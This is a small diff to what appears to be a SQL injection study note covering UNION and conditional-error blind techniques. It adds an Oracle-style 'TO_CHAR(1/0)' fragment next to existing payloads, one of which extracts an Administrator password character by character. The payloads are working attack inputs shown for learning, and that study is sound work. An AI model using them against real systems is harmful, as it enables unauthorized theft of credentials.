@@ -48,6 +48,7 @@ For a UNION query to work, two key requirements must be met:
 > xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
 > xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END-- 
 > xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) > 'm') then 1/0 else null end from users-- 
+> ... TO_CHAR(1/0) ... 
 ```
 
 
